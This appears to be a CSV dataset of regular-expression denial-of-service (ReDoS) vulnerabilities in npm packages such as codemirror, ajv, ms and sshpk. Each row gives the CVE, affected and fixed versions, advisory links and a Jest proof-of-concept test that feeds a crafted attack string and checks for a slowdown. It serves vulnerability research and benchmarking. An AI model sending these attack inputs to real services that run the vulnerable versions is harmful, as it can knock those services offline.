Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
redos,CVE-2020-7760,codemirror,5.58.0,5.58.2,redos/codemirror_5.58.0,"let basicCTypes = [
  ""int"",
  ""long"",
  ""char"",
  ""short"",
  ""double"",
  ""float"",
  ""unsigned"",
  ""signed"",
  ""void"",
  ""bool"",
];
function cTypes(identifier) {
  return (
    basicCTypes.propertyIsEnumerable(identifier) || /.+_t$/.test(identifier)
  );
}
test(""ReDos in codemirror"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  let str = genstr(65536, ""a"");
  let t = measureTime(function () {
    cTypes(str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/codemirror/CodeMirror/commit/55d0333907117c9231ffdf555ae8824705993bbb,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-CODEMIRROR-1016937; https://github.com/advisories/GHSA-4gw3-8f77-f72c
redos,CVE-2020-15366,ajv,5.2.2,6.12.3,redos/ajv_5.2.2,"test(""ReDoS in ajv"", () => {
  const measureTime = require(""../utils"").measureTime;
  let Ajv = require(""ajv"");
  let ajv = new Ajv();
  let t = measureTime(function () {
    ajv.compile({
      type: ""object"",
      properties: {
        foo: {
          type: ""string"",
          oneOf: [{ pattern: ""if("".repeat(10000) + ""x"" + "")"".repeat(10000) }],
        },
      },
    });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,util.js:143:14,https://security.snyk.io/vuln/SNYK-JS-AJV-584908; 
redos,,truncate,2.0.0,2.0.1,redos/truncate_2.0.0,"test(""ReDos in truncate"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const truncate = require(""truncate"");
  let prefix = ""-@w--w--"";
  let pump = ""ww--"";
  let suffix = """";
  let nPumps = 20000;
  let attackString = prefix;
  for (var i = 0; i < nPumps; i++) {
    attackString += pump;
  }
  attackString += suffix;
  let input = ""Hey "" + attackString;
  let t = measureTime(function () {
    truncate(input, 4);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/FGRibreau/node-truncate/commit/a3cea056427b2dfbbffebf24a95419b09db23b22,truncate.js:47:33,https://security.snyk.io/vuln/npm:truncate:20180225; 
redos,,ducktype,1.2.0,1.2.1,redos/ducktype_1.2.0,"test(""ReDos in ducktype"", () => {
  const measureTime = require(""../utils"").measureTime;
  const ducktype = require(""ducktype"");
  let attack_str = ""https://"" + (""."" + ""a"".repeat(110)).repeat(7) + ""\n"";
  let t = measureTime(function () {
    console.log(ducktype.url.test(attack_str));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/josdejong/ducktype/commit/d8b4c902598c9104d5c56225c3fffcbe1368eff6,ducktype.js:165:24,https://security.snyk.io/vuln/npm:ducktype:20180219; 
redos,CVE-2021-3795,semver-regex,3.1.1,3.1.3,redos/semver-regex_3.1.1,"test(""ReDos in semver-regex"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const semverRegex = require(""semver-regex"");
  let version = ""v1.1.3-0a"";
  for (let i = 0; i < 20; i++) {
    version += ""a.a"";
  }
  let attack_str = version + ""aaaaaaa$"";
  let t = measureTime(function () {
    semverRegex().test(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/sindresorhus/semver-regex/commit/11c66245f4e1976dccc52977ed183696a21a3fd7,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-SEMVERREGEX-1585624; https://github.com/advisories/GHSA-44c6-4v22-4mhx
redos,CVE-2021-3777,tmpl,1.0.0,1.0.5,redos/tmpl_1.0.0,"test(""ReDoS in tmpl"", () => {
  const measureTime = require(""../utils"").measureTime;
  const tmpl = require(""tmpl"");
  let payload = ""hello, "" + ""{"".repeat(7 * 10000) + ""day"";
  let t = measureTime(function () {
    tmpl(payload, { day: ""tomorrow"" });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/daaku/nodejs-tmpl/commit/4c654e4d1542f329ed561fd95ccd80f30c6872d6,tmpl.js:8:9,https://security.snyk.io/vuln/SNYK-JS-TMPL-1583443; https://github.com/advisories/GHSA-jgrx-mgxx-jf9v
redos,CVE-2017-16115,timespan,2.3.0,,redos/timespan_2.3.0,"test(""ReDos in timespan"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const timespan = require(""timespan"");
  let t = measureTime(function () {
    var ts = new timespan.parseDate(""NOW-"" + genstr(30000, ""1"") + ""milli"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,time-span.js:385:30,https://security.snyk.io/vuln/npm:timespan:20170907; https://github.com/advisories/GHSA-f523-2f5j-gfcg
redos,CVE-2021-23425,trim-off-newlines,1.0.0,1.0.3,redos/trim-off-newlines_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-TRIMOFFNEWLINES-1296850
test(""ReDos in trim-off-newlines"", () => {
  const measureTime = require(""../utils"").measureTime;
  const trim = require(""trim-off-newlines"");

  const s = ""a"" + ""\n"".repeat(45000) + ""a"";

  let t = measureTime(function () {
    trim(s);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
",https://github.com/stevemao/trim-off-newlines/commit/6226c958cbbac284a840010eb1f6617fb99a5645,index.js:6:13,https://security.snyk.io/vuln/SNYK-JS-TRIMOFFNEWLINES-1296850; https://github.com/advisories/GHSA-38fc-wpqx-33j7
redos,CVE-2021-23346,html-parse-stringify2,2.0.1,,redos/html-parse-stringify2_2.0.1,"test(""ReDos in html-parse-stringify2"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const HTML = require(""html-parse-stringify2"");
  let html = ""<!''''''''''''''''''''''''''''''''''''''''!"";
  let t = measureTime(function () {
    let ast = HTML.parse(html);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/HenrikJoreteg/html-parse-stringify/commit/c7274a48e59c92b2b7e906fedf9065159e73fe12,parse.js:39:10,https://security.snyk.io/vuln/SNYK-JS-HTMLPARSESTRINGIFY2-1079307; https://github.com/advisories/GHSA-545q-3fg6-48m7
redos,CVE-2021-36716,is-email,1.0.0,1.0.1,redos/is-email_1.0.0,"test(""ReDos in is-email"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const isEmail = require(""is-email"");
  let attack_str = """" + genstr(3000, ""@"") + ""!"";
  let t = measureTime(function () {
    isEmail(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/segmentio/is-email/commit/060ecedf345729f11ad857ccaf7a915ff6797739,index.js:13:18,https://security.snyk.io/vuln/SNYK-JS-ISEMAIL-1279002; https://github.com/advisories/GHSA-j377-2x76-558h
redos,,markdown,0.3.0,,redos/markdown_0.3.0,"test(""ReDos in markdown-js"", () => {
  const measureTime = require(""../utils"").measureTime;
  const markdown = require(""markdown"").markdown;
  const { genstr } = require(""../utils"");
  attack_str = ""cispa"" + genstr(300000, ""_"");
  let t = measureTime(function () {
    html_content = markdown.toHTML(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,,https://security.snyk.io/vuln/SNYK-JS-MARKDOWN-597156; https://github.com/advisories/GHSA-wx77-rp39-c6vg
redos,,ethers,5.2.0,5.4.7,redos/ethers_5.2.0,"test(""ReDos in ethers"", () => {
  const measureTime = require(""../utils"").measureTime;
  const { ethers } = require(""ethers"");
  let attack_str = ""a"" + "" "".repeat(33000) + ""a"";
  let t = measureTime(function () {
    try {
      ethers.utils.parseEther(""1."" + ""0"".repeat(60000) + ""1"");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/ethers-io/ethers.js/commit/32a6b2a362815eb85ce3f3abad5adf92f2b80e10,fixednumber.js:97:36,https://security.snyk.io/vuln/SNYK-JS-ETHERS-1586048; 
redos,,terminal-kit,2.1.0,2.1.8,redos/terminal-kit_2.1.0,"test(""ReDos in terminal-kit"", () => {
  const termkit = require(""terminal-kit"");
  const measureTime = require(""../utils"").measureTime;

  let payload = ""^["".repeat(35000);

  let t = measureTime(function () {
    termkit.markupWidth(payload);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
",https://github.com/cronvel/terminal-kit/commit/a2e446cc3927b559d0281683feb9b821e83b758c,misc.js:185:35,https://security.snyk.io/vuln/SNYK-JS-TERMINALKIT-1734787; 
redos,CVE-2021-23354,printf,0.6.0,0.6.1,redos/printf_0.6.0,"test(""ReDos in printf"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const printf = require(""printf"");
  let t = measureTime(function () {
    let attack_str = ""%(0)0"" + genstr(1000, ""0"") + ""\u25CE"";
    printf(attack_str, -42);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,printf.js:14:21,https://security.snyk.io/vuln/SNYK-JS-PRINTF-1072096; https://github.com/advisories/GHSA-xfhp-gmh8-r8v2
redos,CVE-2021-23424,ansi-html,0.0.7,,redos/ansi-html_0.0.7,"test(""ReDoS in ansi-html"", () => {
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    require(""ansi-html"")(""\x1B[0m\x1B["" + ""0"".repeat(30));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:62:18,https://security.snyk.io/vuln/SNYK-JS-ANSIHTML-1296849; https://github.com/advisories/GHSA-whgm-jr23-g3j9
redos,CVE-2018-3737,sshpk,1.13.1,1.14.1,redos/sshpk_1.13.1,"test(""ReDos in sshpk"", () => {
  const sshpk = require(""sshpk"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    let keyPub = `ssh-rsa a${"" "".repeat(30000)}x\nx`;
    try {
      sshpk.parseKey(keyPub, ""ssh"");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,ssh.js:28:18,https://security.snyk.io/vuln/npm:sshpk:20180409; https://github.com/advisories/GHSA-2m39-62fm-q8r3
redos,CVE-2017-16118,forwarded,0.1.0,0.1.2,redos/forwarded_0.1.0,"test(""ReDos in forwarded"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  var fresh = require(""forwarded"");
  var str = ""x"" + genstr(60000, "" "") + ""x"";
  let t = measureTime(function () {
    fresh({
      headers: { ""x-forwarded-for"": str },
      connection: { remoteAddress: ""0.0.0.0"" },
    });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jshttp/forwarded/commit/d469116eda4931fbe1c0ccb29497b35930bfa328,index.js:27:6,https://security.snyk.io/vuln/npm:forwarded:20170908; https://github.com/advisories/GHSA-mpcf-4gmh-23w8
redos,CVE-2021-23367,is-svg,4.2.2,4.3.0,redos/is-svg_4.2.2,"test(""ReDos in is-svg"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const isSvg = require(""is-svg"");
  let attack_str = ""<!Entity"" + genstr(25000, "" "");
  let t = measureTime(function () {
    isSvg(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/sindresorhus/is-svg/commit/732fc72779840c45a30817d3fe28e12058592b02,index.js:21:13,https://security.snyk.io/vuln/SNYK-JS-ISSVG-1243891; https://github.com/advisories/GHSA-7r28-3m3f-r2pr
redos,,colors-cli,1.0.25,1.0.28,redos/colors-cli_1.0.25,"test(""ReDos in colors-cli"", () => {
  const measureTime = require(""../utils"").measureTime;
  const color = require(""colors-cli/safe"");
  let attack_str = ""\x1B["" + "";"".repeat(20000);
  let t = measureTime(function () {
    color.red(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/jaywcjlove/colors-cli/commit/78ee15ba9111ddee1cc0640ccd79369525bd57b8,color-safe.js:60:23,https://security.snyk.io/vuln/SNYK-JS-COLORSCLI-1584218; 
redos,,valid-email,0.0.1,1.0.0,redos/valid-email_0.0.1,"test(""ReDos in valid-email"", () => {
  const validate = require(""valid-email"");
  const measureTime = require(""../utils"").measureTime;
  var pump = ""\\\\a\\\\\\a"";
  var attackString = """";
  for (var i = 0; i < 9; i++) {
    attackString += pump;
  }
  attackString += ""\x0B"";
  var badEmail = `${attackString}@google.com`;
  let t = measureTime(function () {
    validate(badEmail);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/johnhenry/valid-email/commit/624ffa60b42bed8c577a679d682dda286b4603e6,utils.js:391:28,https://security.snyk.io/vuln/npm:valid-email:20180222; 
redos,,htmlparser,1.7.7,,redos/htmlparser_1.7.7,"test(""ReDos in htmlparser"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const htmlparser = require(""htmlparser"");
  let rawHtml = ""<html><x"" + genstr(50000, "" "") + ""x></html>"";
  let handler = new htmlparser.DefaultHandler(function (error, dom) {});
  let parser = new htmlparser.Parser(handler);
  let t = measureTime(function () {
    parser.parseComplete(rawHtml);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,htmlparser.js:226:72,https://security.snyk.io/vuln/npm:node-htmlparser-classic:20170906; 
redos,CVE-2021-23362,hosted-git-info,3.0.0,3.0.8,redos/hosted-git-info_3.0.0,"test(""ReDos in hosted-git-info"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const hostedGitInfo = require(""hosted-git-info"");
  var attack_str = ""a:"" + genstr(49000, ""a"") + ""!"";
  let t = measureTime(function () {
    var parsedInfo = hostedGitInfo.fromUrl(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3,index.js:44:27,https://security.snyk.io/vuln/SNYK-JS-HOSTEDGITINFO-1088355; https://github.com/advisories/GHSA-43f8-2h32-f4cj
redos,CVE-2020-7661,urlregex,0.5.0,,redos/urlregex_0.5.0,"test(""ReDos in urlregex"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const urlRegex = require(""urlregex"");
  let t = measureTime(function () {
    const isValid = urlRegex().test(
      ""http://huntr.devtestvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321""
    );
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,jasmineAsyncInstall.js:106:37,https://github.com/advisories/GHSA-v4rh-8p82-6h5w; https://security.snyk.io/vuln/SNYK-JS-URLREGEX-569472
redos,CVE-2020-1920,react-native,0.63.0-rc.0,0.64.1,redos/react-native_0.63.0-rc.0,"function validateBaseUrl(url) {
  return /^(?:(?:(?:https?|ftp):)?\/\/)(?:(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,}))?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(
    url
  );
}
test(""ReDos in react-native"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    validateBaseUrl(
      ""http://foobar.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.""
    );
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/facebook/react-native/commit/ca09ae82715e33c9ac77b3fa55495cf84ba891c7,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-REACTNATIVE-1298632; https://github.com/advisories/GHSA-7f53-fmmv-mfjv
redos,CVE-2021-23388,ms,0.7.0,1.2.1,redos/ms_0.7.0,"test(""ReDos in ms"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const ms = require(""ms"");
  let attack_str = genstr(20000, ""1"") + ""x"";
  let t = measureTime(function () {
    ms(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/caolan/forms/pull/214/commits/d4bd5b5febfe49c1f585f162e04ec810f8dc47a0,index.js:41:135,https://security.snyk.io/vuln/npm:ms:20170412; https://github.com/advisories/GHSA-c56f-grv3-gpfr
redos,CVE-2020-7767,express-validators,1.0.3,,redos/express-validators_1.0.3,"test(""ReDos in express-validators"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const expressValidators = require(""express-validators"");
  var Obj = { urlValue: ""http://--:$$@------------------------------------!"" };
  var rules = { urlValue: ""url"" };
  var messages = { urlValue: { url: ""https://www.google.com/"" } };
  let t = measureTime(function () {
    expressValidators.validator(Obj, rules, messages, function (
      err,
      validated
    ) {});
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:615:23,https://security.snyk.io/vuln/SNYK-JS-EXPRESSVALIDATORS-1017404; https://github.com/advisories/GHSA-cf2x-rqc8-grfq
redos,,amqp-match,0.0.0,,redos/amqp-match_0.0.0,"test(""ReDoS in amqp-match"", () => {
  const match = require(""amqp-match"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    match(""f"" + ""0"".repeat(19), ""#.bar"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:4:17,https://security.snyk.io/vuln/npm:amqp-match:20170515; 
redos,CVE-2021-23346,html-parse-stringify,2.0.0,2.0.1,redos/html-parse-stringify_2.0.0,"test(""ReDos in html-parse-stringify"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const HTML = require(""html-parse-stringify"");
  let html = ""<!''''''''''''''''''''''''''''''''''''''''!"";
  let t = measureTime(function () {
    let ast = HTML.parse(html);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/HenrikJoreteg/html-parse-stringify/commit/c7274a48e59c92b2b7e906fedf9065159e73fe12,html-parse-stringify.js:1:1428,https://security.snyk.io/vuln/SNYK-JS-HTMLPARSESTRINGIFY-1079306; https://github.com/advisories/GHSA-545q-3fg6-48m7
